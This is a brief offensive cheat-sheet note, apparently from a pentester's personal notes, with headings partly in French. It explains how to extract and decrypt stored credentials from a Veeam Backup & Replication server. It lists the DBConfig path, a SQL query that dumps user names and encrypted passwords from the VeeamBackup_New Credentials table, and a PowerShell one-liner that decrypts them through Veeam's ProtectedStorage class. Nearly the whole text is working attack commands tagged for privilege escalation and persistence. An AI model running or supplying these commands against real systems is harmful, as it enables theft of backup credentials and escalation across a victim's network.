# saz-veeam.md

#plateform/windows
#target/local
#cat/PRIVESC
#cat/PERSIST
#cat/SAJJAD
#tag/curl

## VEEAM Get DataBase (DIR)
```
C:\Program Files\Common Files\Veeam\Backup and Replication\DBConfig\
```

## VEEAM Get DataBase (Run As Administrator)
```
C:\Program Files\Common Files\Veeam\Backup and Replication\DBConfig\Veeam.Backup.DBConfig.exe
```

## VEEAM - Récupérer les MDP DB step 1/2: SQL
```
SELECT TOP 100 [id], [user_name], [password], [usn], [description], [visible], [change_time_utc] FROM [VeeamBackup_New].[dbo].[Credentials];
```

```
<!-- ## VEEAM - Récupérer les MDP DB step 2/2: PowerShell
"$encoded= "<PASSWORD_HASH>""
Add-type -path "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Common.dll"
[Veeam.Backup.Common.ProtectedStorage]::GetLocalString($encoded) -->
```

## VEEAM - Récupérer les MDP DB step 2/2: PowerShell
```
Add-Type -Path "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Common.dll"; [Veeam.Backup.Common.ProtectedStorage]::GetLocalString("<PASSWORD_HASH>")
```
